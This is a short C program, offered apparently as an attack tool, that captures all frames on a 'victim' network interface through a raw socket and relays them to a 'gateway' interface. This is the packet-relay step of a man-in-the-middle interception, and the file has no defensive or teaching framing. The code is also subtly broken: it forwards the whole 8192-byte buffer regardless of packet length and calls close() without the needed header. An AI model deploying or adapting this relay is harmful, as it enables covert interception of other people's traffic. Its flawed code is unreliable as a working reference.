#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <sys/ioctl.h>
#include <net/if.h>

#define MAX_PACKET_SIZE 8192

int main() {
    int sockfd, forward_sockfd;
    char buffer[MAX_PACKET_SIZE];
    struct sockaddr_ll victim_addr, gateway_addr;
    socklen_t addr_size;

    // Create a raw socket for capturing packets
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sockfd < 0) {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }

    // Create a raw socket for forwarding packets
    forward_sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (forward_sockfd < 0) {
        perror("Failed to create socket");
        exit(EXIT_FAILURE);
    }

    // Bind the capture socket to the victim's interface
    memset(&victim_addr, 0, sizeof(victim_addr));
    victim_addr.sll_ifindex = if_nametoindex("victimInterface"); // Replace with your victim interface name
    victim_addr.sll_protocol = htons(ETH_P_ALL);
    if (bind(sockfd, (struct sockaddr*)&victim_addr, sizeof(victim_addr)) < 0) {
        perror("Failed to bind socket");
        exit(EXIT_FAILURE);
    }

    while (1) {
        memset(buffer, 0, MAX_PACKET_SIZE);

        // Capture a packet from the victim's interface
        if (recvfrom(sockfd, buffer, MAX_PACKET_SIZE, 0, NULL, NULL) < 0) {
            perror("Failed to receive packet");
            continue;
        }

        // Forward the packet to the gateway
        memset(&gateway_addr, 0, sizeof(gateway_addr));
        gateway_addr.sll_ifindex = if_nametoindex("gatewayInterface"); // Replace with your gateway interface name
        gateway_addr.sll_protocol = htons(ETH_P_ALL);
        if (sendto(forward_sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&gateway_addr, sizeof(gateway_addr)) < 0) {
            perror("Failed to send packet");
            continue;
        }
    }

    close(sockfd);
    close(forward_sockfd);

    return 0;
}
